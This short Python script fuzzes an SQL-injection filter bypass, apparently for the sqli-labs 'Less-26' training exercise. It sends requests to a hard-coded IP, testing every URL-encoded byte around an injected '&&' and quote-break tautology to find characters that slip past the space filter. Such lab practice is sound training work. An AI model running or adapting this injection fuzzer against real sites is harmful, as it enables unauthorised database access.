# -*- encoding: utf-8 -*-
import requests

for i in range(0, 256):
    # print(i)
    code = hex(i).replace('0x', '')
    if len(code) < 2:
        code = "0" + code
    code_0x = "%" + code
    # print(code_0x)
    url = "http://121.199.30.46/Less-26/?id=1'" + code_0x + "%26%26" + code_0x  + "'1'='1"
    r = requests.get(url=url)
    if "Dumb" in r.content.decode("utf-8", "ignore"):
        print(code_0x)

    